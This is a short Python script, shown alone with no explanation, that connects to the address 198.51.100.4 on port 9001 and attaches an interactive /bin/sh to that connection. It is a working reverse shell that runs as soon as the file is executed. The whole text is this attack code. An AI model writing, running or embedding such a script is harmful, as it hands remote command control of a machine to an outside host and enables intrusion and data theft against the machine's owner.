import socket, subprocess
def main():
    s = socket.socket()
    s.connect(('198.51.100.4', 9001))
    subprocess.Popen(['/bin/sh', '-i'], stdin=s, stdout=s, stderr=s).wait()
main()
